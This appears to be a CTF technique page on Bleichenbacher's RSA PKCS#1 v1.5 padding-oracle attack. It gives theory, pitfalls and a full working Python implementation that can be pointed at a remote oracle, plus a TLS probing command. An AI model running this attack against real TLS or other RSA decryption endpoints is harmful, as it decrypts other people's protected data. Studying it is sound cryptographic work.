---
title: "RSA - Bleichenbacher PKCS#1 v1.5 Padding Oracle (Million Message Attack)"
category: crypto
subcategory: rsa
type: technique
tags: [rsa, bleichenbacher, pkcs1, pkcs1-v15, padding-oracle, million-message-attack, mma, adaptive-chosen-ciphertext, cca2, robot, oracle, tls, interval-narrowing, decryption-oracle, 0x0002, python3, pwntools]
difficulty: hard
summary: "A server that distinguishes 'valid PKCS#1 v1.5 padding' from 'invalid' decrypts any ciphertext in ~10^4-10^6 adaptive queries without the private key."
when_to_use:
  - "The service returns a different error/timing for 'bad padding' vs 'bad content'"
  - "Source does unpad_pkcs1_v15() and raises/returns early on a padding error"
  - "You can send unlimited chosen ciphertexts and learn one bit: conforming or not"
  - "TLS RSA key exchange handshake that reveals decryption failure (ROBOT)"
  - "The challenge mentions PKCS#1 v1.5, 0x00 0x02, 'million message', or Daniel Bleichenbacher"
tools: [python3, pwntools, openssl, rsactftool]
cves: [CVE-2017-13099]
source:
  name: "RFC 8017 (PKCS #1 v2.2)"
  url: "https://www.rfc-editor.org/rfc/rfc8017"
related: [rsa-lsb-parity-oracle, rsa-blinding-decrypt-oracle, rsa-signature-forgery-e3]
---

## TL;DR

PKCS#1 v1.5 encryption blocks start with `0x00 0x02`. An oracle that says whether a
decryption starts with those two bytes leaks that `2B <= m*s mod n < 3B` where
`B = 2^(8(k-2))`. Bleichenbacher's algorithm searches multipliers `s`, intersects the
resulting intervals, and converges to a single value in roughly 2^15-2^20 queries.
No private key, no factoring, works against any RSA-PKCS1v1.5 decryption endpoint.

## Recognise it

- The service decrypts your blob and distinguishes errors: "invalid padding" vs
  "invalid message" vs a generic 500 with different timing.
- Source code: `try: m = PKCS1_v1_5.decrypt(c, sentinel) except ... return "bad padding"`.
- The check is `m[0] == 0 and m[1] == 2` only (a "weak" oracle - the attack is fastest here),
  or the full check including the `0x00` separator and `len(PS) >= 8` (a "strong" oracle -
  still works, needs more queries).
- Anything TLS-RSA related in 2017+ (ROBOT), JOSE `RSA1_5`, XML-Enc, PKCS#11 tokens.

## Theory

Let `k = ceil(log256(n))` (modulus size in bytes) and `B = 2^(8(k-2))`.
A conforming plaintext satisfies

$$2B \le m < 3B$$

The oracle `O(c)` returns true iff `dec(c)` is conforming. Because RSA is homomorphic,
`O(c * s^e mod n)` tells you whether `m*s mod n` lies in `[2B, 3B)`, i.e.

$$2B \le m s - r n < 3B \quad\text{for some integer } r$$

Rearranged, `m` lies in `[ceil((2B + rn)/s), floor((3B - 1 + rn)/s)]`.
Maintaining the set `M` of candidate intervals and intersecting after every successful `s`
shrinks `M` to one point. The phases:

1. **Blinding** - find `s0` with `c*s0^e` conforming (skip if `c` already is).
2. **2a** - search `s >= ceil(n/(3B))` until conforming.
3. **2b** - more than one interval left: `s = s + 1` until conforming.
4. **2c** - exactly one interval `[a,b]`: choose `r >= ceil(2(bs - 2B)/n)` and search
   `s` in `[ceil((2B + rn)/b), ceil((3B + rn)/a))`. This is the fast phase: each success
   roughly halves the interval.
5. **3** - recompute `M` from all `(a, b, r)` triples.
6. **4** - when `M = {[a,a]}`, `m = a * s0^{-1} mod n`.

## Attack

1. Wrap the service in `oracle(ciphertext) -> bool`.
2. Sanity-check it: encrypt a properly padded message with the public key, confirm the
   oracle says True; flip a byte, confirm False.
3. Run the algorithm below. Expect 2^14-2^20 queries; budget the time.
4. Strip the padding from the recovered integer: everything after the `0x00` separator.

## Code

```python
#!/usr/bin/env python3
"""Bleichenbacher's PKCS#1 v1.5 padding-oracle attack, with a local oracle for testing.

    python3 bleichenbacher.py      # self-test: 256-bit modulus, ~14k queries, a few seconds

Plug a remote oracle in by replacing `oracle` with a function that sends the
ciphertext to the service and returns True/False.
"""
from __future__ import annotations

import sys

try:
    from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
except ImportError:
    import random as _r

    def bytes_to_long(b: bytes) -> int:
        return int.from_bytes(b, "big")

    def long_to_bytes(x: int) -> bytes:
        return x.to_bytes(max(1, (x.bit_length() + 7) // 8), "big")

    def _is_prime(n: int) -> bool:
        for p in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37):
            if n % p == 0:
                return n == p
        d, s = n - 1, 0
        while d % 2 == 0:
            d //= 2
            s += 1
        for a in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37):
            x = pow(a, d, n)
            if x in (1, n - 1):
                continue
            for _ in range(s - 1):
                x = x * x % n
                if x == n - 1:
                    break
            else:
                return False
        return True

    def getPrime(bits: int) -> int:
        while True:
            c = _r.getrandbits(bits) | (1 << (bits - 1)) | 1
            if _is_prime(c):
                return c


def ceildiv(a: int, b: int) -> int:
    return -(-a // b)


def pkcs1_pad(msg: bytes, k: int, rng) -> bytes:
    """EME-PKCS1-v1_5 encryption block: 00 02 <PS, >=8 nonzero bytes> 00 <msg>."""
    if len(msg) > k - 11:
        raise ValueError("message too long for this modulus")
    ps = bytearray()
    while len(ps) < k - 3 - len(msg):
        b = rng.randrange(1, 256)
        ps.append(b)
    return b"\x00\x02" + bytes(ps) + b"\x00" + msg


def pkcs1_unpad(block: bytes) -> bytes:
    if len(block) < 11 or block[0] != 0 or block[1] != 2:
        raise ValueError("bad padding")
    idx = block.find(b"\x00", 2)
    if idx < 10:
        raise ValueError("bad padding (PS too short)")
    return block[idx + 1:]


def bleichenbacher(n: int, e: int, c: int, oracle, k: int,
                   verbose: bool = True) -> int:
    """Return the PKCS#1-padded plaintext integer of c. `oracle(ct) -> bool`."""
    B = 1 << (8 * (k - 2))
    B2, B3 = 2 * B, 3 * B

    # ---- step 1: blinding (only needed if c itself is not conforming) ----- #
    s0 = 1
    c0 = c % n
    if not oracle(c0):
        s0 = 2
        while not oracle(c * pow(s0, e, n) % n):
            s0 += 1
        c0 = c * pow(s0, e, n) % n
        if verbose:
            print(f"[i] blinded with s0 = {s0}")

    M = [(B2, B3 - 1)]

    # ---- step 2a: first search ------------------------------------------- #
    s = ceildiv(n, B3)
    while not oracle(c0 * pow(s, e, n) % n):
        s += 1
    if verbose:
        print(f"[i] step 2a done, s = {s}")

    it = 0
    while True:
        it += 1
        # ---- step 3: narrow the interval set ------------------------------ #
        Mnew = set()
        for a, b in M:
            r_lo = ceildiv(a * s - B3 + 1, n)
            r_hi = (b * s - B2) // n
            for r in range(r_lo, r_hi + 1):
                na = max(a, ceildiv(B2 + r * n, s))
                nb = min(b, (B3 - 1 + r * n) // s)
                if na <= nb:
                    Mnew.add((na, nb))
        assert Mnew, "interval set became empty: the oracle is lying or k is wrong"
        M = sorted(Mnew)
        if verbose and it % 50 == 0:
            a, b = M[0]
            print(f"    [{it:5d}] intervals: {len(M)}, width 2^{(b - a).bit_length()}")

        # ---- step 4: done? ------------------------------------------------ #
        if len(M) == 1 and M[0][0] == M[0][1]:
            m = M[0][0]
            if s0 != 1:
                m = m * pow(s0, -1, n) % n
            return m

        # ---- step 2b / 2c: next s ----------------------------------------- #
        if len(M) > 1:
            s += 1
            while not oracle(c0 * pow(s, e, n) % n):
                s += 1
        else:
            a, b = M[0]
            r = ceildiv(2 * (b * s - B2), n)
            done = False
            while not done:
                s_lo = ceildiv(B2 + r * n, b)
                s_hi = ceildiv(B3 + r * n, a)
                for cand in range(s_lo, s_hi):
                    if oracle(c0 * pow(cand, e, n) % n):
                        s, done = cand, True
                        break
                r += 1


# --------------------------------------------------------------------------- #
def _selftest() -> None:
    import random
    import time
    random.seed(3)

    nbits = 256                       # small so the self-test finishes in seconds
    k = nbits // 8
    while True:
        p, q = getPrime(nbits // 2), getPrime(nbits // 2)
        n = p * q
        if n.bit_length() == nbits and p != q:
            break
    e = 65537
    d = pow(e, -1, (p - 1) * (q - 1))

    secret = b"CTF{pkcs1_v15}"
    block = pkcs1_pad(secret, k, random)
    m = bytes_to_long(block)
    c = pow(m, e, n)

    stats = {"q": 0}

    def oracle(ct: int) -> bool:
        """Weak oracle: only checks the 00 02 prefix (the common CTF case)."""
        stats["q"] += 1
        pt = pow(ct, d, n).to_bytes(k, "big")
        return pt[0] == 0 and pt[1] == 2

    t0 = time.time()
    rec = bleichenbacher(n, e, c, oracle, k, verbose=False)
    assert rec == m, "bleichenbacher failed"
    assert pkcs1_unpad(long_to_bytes(rec).rjust(k, b"\x00")) == secret
    print(f"[+] recovered {secret!r} in {stats['q']} oracle queries, "
          f"{time.time() - t0:.1f}s")

    # sanity: padding helpers round-trip
    assert pkcs1_unpad(pkcs1_pad(b"hello", 64, random)) == b"hello"
    try:
        pkcs1_unpad(b"\x00\x01" + b"\xff" * 20 + b"\x00" + b"x")
        raise AssertionError("must reject 00 01 blocks")
    except ValueError:
        pass
    print("[+] padding helpers ok")
    print("[*] all self-tests passed")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print(__doc__)
    else:
        _selftest()
```

## Variants & pitfalls

- **`k` must be exact.** `k = (n.bit_length() + 7) // 8`. If the modulus is 2047 bits,
  `k = 256` and `B = 2^2032`. Getting `k` wrong makes step 3 produce an empty interval set.
- **Weak vs strong oracle.** If the server also checks the `0x00` separator and
  `len(PS) >= 8`, the conforming set is smaller, so more queries (still ~2^20 for 1024-bit).
  The algorithm is unchanged.
- **Timing-only oracle**: measure many samples per query and threshold. Slow but real
  (this is what ROBOT exploited over TLS).
- **Do not blind if `c` is already conforming** - a real captured ciphertext usually is,
  which saves the entire step-1 search.
- **Query budget**: 1024-bit + weak oracle is roughly 20k-60k queries; strong oracle
  hundreds of thousands. Parallelise the step-2c range scan if the service allows
  concurrent connections.
- **Trimmers** (Bardou et al. 2012) cut the query count by 2-4x by first finding
  multipliers `u/t` that keep the message conforming; worth implementing only for a
  rate-limited service.
- **Signature forgery** is a different PKCS#1 bug: see `rsa-signature-forgery-e3`.
- **OAEP (PKCS#1 v2)** is not vulnerable to this; Manger's attack is the OAEP analogue and
  needs only ~1000 queries, but requires distinguishing the "integer too large" error.

## Tools

```bash
# check what a TLS server does with a malformed RSA premaster (ROBOT tester idea)
openssl s_client -connect host:443 -cipher 'RSA' -tls1_2

# generate a PKCS#1 v1.5 test blob with the public key
python3 -c '
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
k = RSA.import_key(open("pub.pem").read())
print(PKCS1_v1_5.new(k).encrypt(b"test").hex())'
```

## References

- D. Bleichenbacher, "Chosen Ciphertext Attacks Against Protocols Based on the RSA
  Encryption Standard PKCS #1" (CRYPTO 1998)
- Bardou, Focardi, Kawamoto, Simionato, Steel, Tsay, "Efficient Padding Oracle Attacks on
  Cryptographic Hardware" (CRYPTO 2012) - trimmers
- Boeck, Somorovsky, Young, "Return Of Bleichenbacher's Oracle Threat (ROBOT)"
  (USENIX Security 2018)
- RFC 8017: https://www.rfc-editor.org/rfc/rfc8017
